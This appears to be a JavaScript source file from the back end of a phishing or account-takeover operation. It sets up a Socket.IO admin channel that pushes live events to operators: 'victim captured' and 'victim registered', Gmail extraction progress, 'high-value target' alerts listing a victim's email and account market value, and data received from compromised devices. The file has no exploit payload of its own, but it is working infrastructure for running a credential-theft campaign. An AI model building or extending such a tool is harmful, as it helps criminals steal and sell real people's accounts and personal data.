// Admin real-time updates via Socket.IO
// Handles real-time notifications for admin dashboard

const jwt = require('jsonwebtoken');
const { PrismaClient } = require('@prisma/client');
const AdminUserRepository = require('../repositories/adminUserRepository');
const config = require('../config');
const logger = require('../utils/logger');

const prisma = new PrismaClient();
const adminUserRepository = new AdminUserRepository(prisma);

function extractSocketToken(socket) {
  const header = socket.handshake.headers?.authorization;
  if (header && header.startsWith('Bearer ')) {
    return header.substring(7);
  }
  return (
    socket.handshake.auth?.token ||
    socket.handshake.query?.token ||
    null
  );
}

/**
 * Setup admin Socket.IO handlers
 * @param {Object} io - Socket.IO server instance
 */
function setupAdminHandlers(io) {
  const adminNamespace = io.of('/admin');

  adminNamespace.use(async (socket, next) => {
    try {
      const token = extractSocketToken(socket);
      if (!token) {
        return next(new Error('Authentication required'));
      }

      const decoded = jwt.verify(token, config.security.jwtSecret);
      const admin = await adminUserRepository.findById(decoded.userId);

      if (!admin || !admin.isActive) {
        return next(new Error('Invalid or inactive admin user'));
      }

      socket.admin = {
        id: admin.id,
        username: admin.username,
        role: admin.role,
        permissions: admin.permissions || [],
      };

      return next();
    } catch (error) {
      logger.warn('Admin socket authentication failed', {
        socketId: socket.id,
        error: error.message,
      });
      return next(new Error('Authentication failed'));
    }
  });

  adminNamespace.on('connection', (socket) => {
    console.log('Admin client connected:', socket.id);

    // Join admin room for broadcasts
    socket.join('admins');

    // Handle real-time updates subscription
    socket.on('subscribe:updates', (data) => {
      const { type, filters } = data;
      
      // Subscribe to specific update types
      switch (type) {
        case 'victims':
          socket.join('updates:victims');
          break;
        case 'campaigns':
          socket.join('updates:campaigns');
          break;
        case 'gmail':
          socket.join('updates:gmail');
          break;
        case 'activity':
          socket.join('updates:activity');
          break;
        case 'devices':
          socket.join('updates:devices');
          break;
        default:
          socket.join('updates:all');
      }
    });

    socket.on('disconnect', () => {
      console.log('Admin client disconnected:', socket.id);
    });
  });

  return adminNamespace;
}

/**
 * Emit real-time update to admin clients
 * @param {Object} io - Socket.IO server instance
 * @param {string} type - Update type
 * @param {Object} data - Update data
 */
function emitAdminUpdate(io, type, data) {
  // Emit to both /admin namespace and main namespace 'admin' room
  const adminNamespace = io.of('/admin');
  adminNamespace.to(`updates:${type}`).to('updates:all').to('admins').emit('update', {
    type,
    data,
    timestamp: new Date().toISOString()
  });
  
  // Also emit to main namespace 'admin' room for backward compatibility
  io.to('admin').emit('update', {
    type,
    data,
    timestamp: new Date().toISOString()
  });
}

/**
 * Emit victim captured event
 */
function emitVictimCaptured(io, victimData) {
  emitAdminUpdate(io, 'victim:captured', victimData);
  io.to('admin').emit('victim:captured', victimData);
}

/**
 * Emit victim registered event
 */
function emitVictimRegistered(io, victimData) {
  emitAdminUpdate(io, 'victim:registered', victimData);
  io.to('admin').emit('victim:registered', victimData);
}

/**
 * Emit campaign created/updated event
 */
function emitCampaignUpdate(io, eventType, campaignData) {
  emitAdminUpdate(io, `campaign:${eventType}`, campaignData);
  io.to('admin').emit(`campaign:${eventType}`, campaignData);
}

/**
 * Emit Gmail access/extraction event
 */
function emitGmailUpdate(io, eventType, gmailData) {
  emitAdminUpdate(io, `gmail:${eventType}`, gmailData);
  io.to('admin').emit(`gmail:${eventType}`, gmailData);
}

/**
 * Emit Gmail extraction progress
 */
function emitGmailExtractionProgress(io, sessionId, progress) {
  const progressData = {
    sessionId,
    progress: progress.percentage || 0,
    status: progress.status || 'in_progress',
    itemsExtracted: progress.itemsExtracted || {},
    timestamp: new Date().toISOString()
  };
  
  emitAdminUpdate(io, 'gmail:extraction-progress', progressData);
  // Also emit to specific session room
  io.of('/admin').to(`session:${sessionId}`).emit('gmail:extraction-progress', progressData);
}

/**
 * Emit campaign status change
 */
function emitCampaignStatusChange(io, campaignId, oldStatus, newStatus, campaignData) {
  emitAdminUpdate(io, 'campaign:status-changed', {
    campaignId,
    oldStatus,
    newStatus,
    campaign: campaignData,
    timestamp: new Date().toISOString()
  });
}

/**
 * Emit high-value target alert
 */
function emitHighValueTargetAlert(io, victimData) {
  emitAdminUpdate(io, 'alert:high-value-target', {
    victimId: victimData.id,
    email: victimData.email,
    marketValue: victimData.validation?.market_value,
    accountType: victimData.validation?.account_type,
    timestamp: new Date().toISOString()
  });
}

/**
 * Emit system health update
 */
function emitSystemHealthUpdate(io, healthData) {
  emitAdminUpdate(io, 'system:health-update', {
    ...healthData,
    timestamp: new Date().toISOString()
  });
}

/**
 * Emit dashboard statistics update
 */
function emitDashboardStatsUpdate(io, stats) {
  emitAdminUpdate(io, 'dashboard:stats-update', {
    ...stats,
    timestamp: new Date().toISOString()
  });
}

/**
 * Emit activity log event
 */
function emitActivityLog(io, activityData) {
  emitAdminUpdate(io, 'activity:new', {
    ...activityData,
    timestamp: new Date().toISOString()
  });
}

/**
 * Emit victim validation complete
 */
function emitVictimValidationComplete(io, victimId, validationResults) {
  emitAdminUpdate(io, 'victim:validation-complete', {
    victimId,
    validation: validationResults,
    timestamp: new Date().toISOString()
  });
}

/**
 * Emit device connected event
 */
function emitDeviceConnected(io, deviceData) {
  emitAdminUpdate(io, 'device:connected', {
    ...deviceData,
    timestamp: new Date().toISOString()
  });
  // Also emit to main namespace for backward compatibility
  io.to('admin').emit('device:connected', deviceData);
}

/**
 * Emit device disconnected event
 */
function emitDeviceDisconnected(io, deviceData) {
  emitAdminUpdate(io, 'device:disconnected', {
    ...deviceData,
    timestamp: new Date().toISOString()
  });
  // Also emit to main namespace for backward compatibility
  io.to('admin').emit('device:disconnected', deviceData);
}

/**
 * Emit device status changed event
 */
function emitDeviceStatusChanged(io, deviceId, oldStatus, newStatus, deviceData) {
  emitAdminUpdate(io, 'device:status-changed', {
    deviceId,
    oldStatus,
    newStatus,
    device: deviceData,
    timestamp: new Date().toISOString()
  });
  // Also emit to main namespace for backward compatibility
  io.to('admin').emit('device:status-changed', {
    deviceId,
    oldStatus,
    newStatus,
    device: deviceData
  });
}

/**
 * Emit device data received event
 */
function emitDeviceDataReceived(io, deviceId, dataType, data) {
  emitAdminUpdate(io, 'device:data-received', {
    deviceId,
    dataType,
    data,
    timestamp: new Date().toISOString()
  });
  // Also emit to main namespace for backward compatibility
  io.to('admin').emit('device:data-received', {
    deviceId,
    dataType,
    data
  });
}

/**
 * Emit activity log created event
 */
function emitActivityLogCreated(io, activityLog) {
  emitAdminUpdate(io, 'activity:log-created', {
    ...activityLog,
    timestamp: new Date().toISOString()
  });
  // Also emit generic activity event
  emitActivityLog(io, activityLog);
}

module.exports = {
  setupAdminHandlers,
  emitAdminUpdate,
  emitVictimCaptured,
  emitVictimRegistered,
  emitCampaignUpdate,
  emitGmailUpdate,
  emitGmailExtractionProgress,
  emitCampaignStatusChange,
  emitHighValueTargetAlert,
  emitSystemHealthUpdate,
  emitDashboardStatsUpdate,
  emitActivityLog,
  emitVictimValidationComplete,
  emitDeviceConnected,
  emitDeviceDisconnected,
  emitDeviceStatusChanged,
  emitDeviceDataReceived,
  emitActivityLogCreated
};
